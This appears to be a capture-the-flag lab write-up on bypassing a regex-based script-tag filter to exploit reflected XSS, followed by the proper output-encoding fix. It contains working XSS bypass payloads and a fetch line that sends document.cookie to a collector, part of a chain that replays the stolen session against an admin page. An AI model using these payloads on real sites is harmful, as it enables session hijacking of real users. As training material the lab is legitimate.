# Lab 20 — Findit

## The bug

```python
safe = re.sub(r"(?i)<script[^>]*>", "", q)
```

A single pass that *deletes* matches. The output of the deletion is never
re-examined, so any input whose deletion **creates** a match wins:

```
input:   <scr<script>ipt>alert(1)</script>
delete:  <scr________ipt>alert(1)</script>
result:  <script>alert(1)</script>
```

This is the defining flaw of remove-based sanitisers, and it applies to every
variant: `..` stripping in path traversal, `union` stripping in SQL filters,
`SELECT` stripping in WAF rules. **A sanitiser that deletes must run to a fixed
point, or not delete at all.**

Other bypasses worth trying on any tag filter:

```
<ScRiPt>                    case, if the regex is not /i
<script                     no closing bracket; the parser recovers
<svg/onload=…>              a different tag entirely
<img src=x onerror=…>       an event handler, not a tag name
javascript&colon;           entity-encoded scheme
<a href="jav&#x09;ascript:…">
```

## Confirm the bypass before spending the bait

The report feature is a one-shot: send the admin a URL that does not fire and
you have burned a visit and learned nothing. Check the reflection first.

```bash
h5i browser open http://127.0.0.1:9200/ --session lab20 --new --capture
h5i websec replay req_0 --session lab20 --create --set path=/search \
    --set 'query.q=<scr<script>ipt>alert(1)</script>'
h5i websec show res_1 --session lab20 --raw
```

You want to see a literal `<script>` in the response body. That is the
difference between "my payload was reflected" and "my payload survived".

## The chain

1. **Reflect** — the search page renders your HTML.
2. **Deliver** — `/report?url=…` gets an administrator to open it. On a real
   target this is a support ticket, a "share" link, an @mention, or a page the
   victim already visits.
3. **Exfiltrate** — `fetch('/collect?id=…&c='+encodeURIComponent(document.cookie))`.
   Here the collector is on the lab; on an engagement it is a host you own, and
   the request itself is the signal even if the response is unreadable.
4. **Use** — replay `/admin/flag` with the stolen cookie:
   `--set cookie.session=<stolen>`.

Step 4 is the one that turns a screenshot of `alert(1)` into a finding a client
will act on. Always take the chain to something that matters.

## About the victim

The administrator in this lab is a real h5i browser:

```python
h5i browser open  <login-url> --session victim --new --script --allow 127.0.0.1
h5i browser navigate <your-url> --session victim
h5i browser close --session victim
```

Two honest caveats about using h5i as the victim, because they will bite you:

* `--script` is required. Without it the engine fetches the page and runs
  nothing, and every payload reads as a failure.
* The engine runs `<script>` and `fetch` faithfully. It does **not** implement
  every DOM event — `<img onerror>` may not fire where a `<script>` block does.
  When a payload does not land, test the sink itself (`<script>fetch('/collect?
  id=x&c=alive')</script>`) before you conclude the injection failed.

## The fix

Do not filter HTML — **encode on output**, in the context you are writing into:

```python
f"<p>Nothing found for: {html.escape(q)}</p>"
```

`html.escape` for text nodes, attribute-encoding inside attributes, JSON
encoding inside `<script>`, URL-encoding inside a `href`. Where users must be
allowed *some* markup, parse to a tree and re-serialise an allowlist
(DOMPurify, bleach) — never regex over the string.

Then, defence in depth: `Content-Security-Policy` without `unsafe-inline`,
`HttpOnly` on the session cookie (which is Lab 21 — and Lab 21 shows why it is
not enough), `SameSite=Lax`, and short session lifetimes.

## h5i technique

Two h5i sessions on two sides of the same exploit: yours drives the workbench,
the lab's drives the victim. `--set cookie.session=` to become the victim once
you hold the credential.
